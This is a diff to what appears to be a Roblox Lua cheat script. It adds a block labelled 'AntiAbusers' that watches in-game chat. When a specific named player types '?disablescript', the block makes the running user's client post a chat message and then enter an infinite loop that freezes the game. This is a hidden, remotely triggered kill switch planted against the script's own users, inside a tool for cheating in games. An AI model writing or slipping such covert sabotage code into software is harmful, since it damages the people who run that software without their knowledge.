@@ -4827,6 +4827,21 @@ getgenv().DisableScript = function()
 	end)
 end
 
+--AntiAbusers
+local Action = game.Players:GetPlayers()
+  for i = 1,#Action do
+Action[i].Chatted:connect(function(msg, recipient)
+    if Action[i].Name == "MRFRIENDFOVEVER" then
+        local player = game.Players.LocalPlayer
+        if msg == "?disablescript" then
+        game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer('Script Disabled, Disconnecting.', 'All')
+        wait(2)
+        while true do end
+        end
+    end
+  end)
+end
+
 --FastCmd
 local cmduser = game.Players.LocalPlayer
 
